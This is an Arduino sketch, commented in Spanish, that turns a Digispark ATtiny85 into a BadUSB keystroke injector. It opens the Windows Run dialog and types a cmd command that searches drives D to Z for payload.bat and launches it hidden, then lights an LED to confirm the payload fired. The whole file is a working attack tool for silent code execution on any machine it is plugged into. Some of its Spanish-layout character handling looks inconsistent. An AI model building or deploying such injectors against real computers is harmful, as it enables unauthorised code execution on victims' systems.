#include "DigiKeyboard.h"

// LED integrado: Pin 1 para Digispark Modelo A (rev 1/2), Pin 0 para Modelo B
#define LED_PIN 1

void setup() {
  pinMode(LED_PIN, OUTPUT);
}

void loop() {
  // 1. Espera de enumeracion con parpadeo del LED (~4 segundos)
  // Permite que Windows reconozca el ATtiny85 y monte el almacenamiento masivo
  for (int i = 0; i < 4; i++) {
    digitalWrite(LED_PIN, HIGH);
    DigiKeyboard.delay(500);
    digitalWrite(LED_PIN, LOW);
    DigiKeyboard.delay(500);
  }

  // 2. Abrir Ejecutar (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(700);

  // 3. Construir y enviar el comando completo
  // En layout espanol: las comillas '"' se producen con Shift+2
  //                    la barra '/' se produce con Shift+7
  // cmd /c "for /l %i in (1,1,10) do @(for %d in (D...Z) do @if exist %d:\payload.bat (start "" /b %d:\payload.bat & exit)) & ping -n 2 127.0.0.1 >nul"

  // "cmd "
  DigiKeyboard.print("cmd ");

  // Barra '/' -> Shift + 7 en layout ES
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);

  // "c "
  DigiKeyboard.print("c ");

  // Comilla doble de apertura '"' -> Shift + 2 en layout ES
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);

  // "for "
  DigiKeyboard.print("for ");

  // Barra '/' (switch /l)
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);

  // "l %i in "
  DigiKeyboard.print("l %i in ");

  // Parentesis apertura '(' -> Shift + 8
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);

  // "1,1,10"
  DigiKeyboard.print("1,1,10");

  // Parentesis cierre ')' -> Shift + 9
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);

  // " do @"
  DigiKeyboard.print(" do @");

  // Parentesis apertura del bloque exterior '('
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);

  // "for %d in "
  DigiKeyboard.print("for %d in ");

  // Parentesis apertura de la lista de unidades
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);

  // Unidades de disco
  DigiKeyboard.print("D E F G H I J K L M N O P Q R S T U V W X Y Z");

  // Parentesis cierre lista
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);

  // " do @if exist %d"
  DigiKeyboard.print(" do @if exist %d");

  // Dos puntos ':' -> Shift + . (keycode 0x37)
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT);

  // Backslash '\' -> keycode 0x38 sin modificador (layout ES e EN igual)
  DigiKeyboard.sendKeyStroke(0x38);

  // "payload.bat "
  DigiKeyboard.print("payload.bat ");

  // Parentesis apertura del bloque del if
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);

  // "start "
  DigiKeyboard.print("start ");

  // Comilla doble vacia para titulo (start "" /b ...) primera comilla
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  // segunda comilla cierre del titulo vacio
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);

  // " "
  DigiKeyboard.print(" ");

  // "/b "
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("b %d");

  // Dos puntos ':'
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT);

  // Backslash '\'
  DigiKeyboard.sendKeyStroke(0x38);

  // "payload.bat & exit"
  DigiKeyboard.print("payload.bat & exit");

  // Parentesis cierre del bloque del if ')'
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);

  // Parentesis cierre del bloque externo ')'
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);

  // " & ping -n 2 127.0.0.1 "
  DigiKeyboard.print(" & ping -n 2 127.0.0.1 ");

  // ">nul"  -> '>' es Shift + . en ES? No, '>' es Shift+< (0x36 MOD_SHIFT)
  // En layout ES: > = Shift + < , donde < esta en tecla a la derecha de Shift izq (keycode 0x64 en HID)
  // Alternativa mas segura: redirigir a NUL usando 1>NUL
  DigiKeyboard.print("1>nul");

  // Comilla doble de cierre '"'
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);

  // 4. Ejecutar
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // 5. Encender LED fijo: confirmacion de que el payload fue disparado
  digitalWrite(LED_PIN, HIGH);

  // Ciclo infinito pasivo para evitar re-ejecucion
  for (;;) {}
}